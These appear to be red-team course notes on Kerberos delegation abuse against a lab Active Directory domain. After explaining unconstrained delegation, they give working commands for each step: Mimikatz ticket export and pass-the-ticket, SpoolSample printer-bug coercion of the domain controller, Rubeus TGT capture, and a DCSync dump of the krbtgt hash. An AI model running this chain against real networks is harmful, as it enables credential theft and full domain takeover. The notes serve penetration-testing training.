# Domain Privilege Escalation - Delegations

- [Domain Privilege Escalation - Delegations](#domain-privilege-escalation---delegations)
  - [Kerberos Delegation](#kerberos-delegation)
  - [Unconstrained Delegation](#unconstrained-delegation)
  - [Leveraging Unconstrained Delegation](#leveraging-unconstrained-delegation)
  - [Printer Bug](#printer-bug)

----

## Kerberos Delegation

Kerberos Delegation allows to "*reuse the end-user credentials to access resources hosted on a different server*". This is typically useful in multi-tier service or applications where Kerberos Double Hop is required.

For example, a user authenticates to a web server and web server makes requests to a database server. The web server can request access to resources (all or some resources depending on the type of delegation) on the database server as the user (impersonation) and not as the web server's service account.

Please note that, for the above example, **the service account for web service must be trusted for delegation** to be able to make requests as a user.

There are two types of Kerberos Delegation:

1. **General/Basic** or **Unconstrained Delegation** which allows the first hop server (web server in our example) to **request access to any service on any computer in the domain**.<br/>
2. **Constrained Delegation** which allows the first hop server (web server in our example) to request access **only to specified services on specified computers**.

<br/>

## Unconstrained Delegation

![picture 40](images/7c264278d9152e03ee5463b5f21a9991e9d4e49621f771068c2067791f1bbe2a.png)  

1. A user provides credentials to the Domain Controller. 
2. The DC returns a TGT. 
3. The user requests a TGS for the web service on Web Server.
4. The DC provides a TGS. 
5. The user sends the TGT and TGS to the web server. 
6. The web server service account use the user's TGT to request a TGS for the database server from the DC.
7. The web server service account connects to the database server as the user.

<br/>

When unconstrained delegation is enabled, **the DC places user's TGT inside TGS** (Step 4 in the previous diagram). 

When presented to the server with unconstrained delegation, **the TGT is extracted from TGS and stored in LSASS**. This way the server can reuse the user's TGT to access any other resource as the user.

This could be used to escalate privileges in case **we can compromise the computer with unconstrained delegation and a Domain Admin connects to that machine**.

<br/>

![picture 41](images/5b096f586226c250380adffac2c4cb0f60e4f0d6221d73da29bb9804185450a0.png)  

<br/>

## Leveraging Unconstrained Delegation

Discover domain computers which have unconstrained delegation enabled.

- PowerView

```
Get-DomainComputer -UnConstrained
```

- AD Module

```
Get-ADComputer -Filter {TrustedForDelegation -eq $True}
```

```
Get-ADUser -Filter {TrustedForDelegation -eq $True}
```

<br/>

Compromise the server(s) where Unconstrained delegation is enabled. We must **`trick`** a domain admin or other high privilege user to connect to a service on us-web.

After the connection, we can export TGTs using the below command:

```
Invoke-Mimikatz –Command '"sekurlsa::tickets /export"'
```

The ticket could be reused:

```
Invoke-Mimikatz –Command '"kerberos::ptt ticket.kirbi"'
```

<br/>

How do we trick a high privilege user to connect to a machine with Unconstrained Delegation? The Social Engineering way!

![picture 42](images/b1d8c5f21d28197255c9f72d2d3d0f405a6737d771aa728ab9967f35fbecc88f.png)  

<br/>

## Printer Bug

![picture 43](images/9f6c90efda5fd1eda724495f467277fe9d8b005e2428d067bae9cc1648d2a1db.png)  

How do we trick a high privilege user to connect to a machine with Unconstrained Delegation? The Printer Bug!

A feature of **MS-RPRN** which allows any domain user (Authenticated User) can force any machine (running the Spooler service) to connect to second a machine of the domain user's choice.

Abusing Printer Bug (yes the attacker is wearing a Balaclava :P)

![picture 44](images/b1823cb42d9679aaf6922a5e02e74c8e8d920b44985538fbc235fa5086c73b9d.png)  

<br/>

Let's use **MS-RPRN.exe** (https://github.com/leechristensen/SpoolSample) on `usweb`:

```
.\MS-RPRN.exe \\us-dc.us.techcorp.local \\us-web.us.techcorp.local
```

<br/>

We can capture the TGT of `us-dc$` by using `Rubeus` (https://github.com/GhostPack/Rubeus) on `us-web`:

```
.\Rubeus.exe monitor /interval:5
```

<br/>

Copy the base64 encoded TGT, remove extra spaces and use it on the attacker' machine:

```
.\Rubeus.exe ptt /ticket:<>
```

Or you can use `Invoke-Mimikatz`:

```
[IO.File]::WriteAllBytes("C:\AD\Tools\USDC.kirbi", [Convert]::FromBase64String("ticket_from_Rubeus_monitor"))

Invoke-Mimikatz -Command '"kerberos::ptt C:\AD\Tools\USDC.kirbi"'
```

<br/>

Then run DCSync:

```
Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\krbtgt"'
```

